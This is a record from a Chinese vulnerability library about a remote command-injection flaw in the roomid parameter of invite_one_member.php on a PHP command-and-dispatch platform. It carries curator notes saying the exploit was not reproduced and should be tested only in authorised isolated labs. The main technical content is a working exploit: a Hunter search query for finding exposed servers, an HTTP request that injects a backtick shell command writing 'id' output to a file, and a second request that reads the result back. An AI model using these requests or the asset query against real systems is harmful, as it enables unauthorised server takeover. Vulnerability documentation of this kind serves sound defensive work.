---
source: "wy876 漏洞文库"
title: "指挥调度平台PHP版（科立讯归属待核） audiobroadcast invite_one_member roomid命令注入"
product: "指挥调度平台PHP版（科立讯归属待核）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，Unix shell和可写工作目录"
prerequisites: "请求带PHP会话"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qrlgzdlrg8kwz94r"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%9E%8D%E5%90%88%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0/%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0invite_one_member%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "</font>"
hunter: "web.body=\"app/structure/departments.php\""
id: "vw-70e64e9ab755032a6dc3152c"
entity_id: "ve-70e64e9ab755032a6dc3152c"
schema_version: "1"
---

# 指挥调度平台PHP版（科立讯归属待核） audiobroadcast invite_one_member roomid命令注入

## 条目说明

- 对象与具体问题：指挥调度平台PHP版（科立讯归属待核）；audiobroadcast invite_one_member roomid命令注入
- 版本、配置及部署条件：未知版本，Unix shell和可写工作目录
- 认证与权限前提：请求带PHP会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与537模板几乎同但路由及回显目录不同，不能直接删除独立入口
- 文件落盘无清理，是否实际执行及会话权限无响应证明
- 版本节缺、fofa变</font>、查询HTML污染；缺修复

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
指挥调度管理平台是一个专业针对通信行业的管理平台。该产品旨在提供高效的指挥调度喝管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务。指挥调度平台invite_one_member存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

## 三、资产测绘
+ hunter`web.body="app/structure/departments.php"`
+ 特征


## 四、漏洞复现
```http
GET /api/client/audiobroadcast/invite_one_member.php?callee=1&roomid=`id>1.txt` HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2
Upgrade-Insecure-Requests: 1
```


获取命令执行结果

```http
GET /api/client/audiobroadcast/1.txt HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=9d162ed31bcb785f6f5cb1fcc92dfff2
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qrlgzdlrg8kwz94r>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
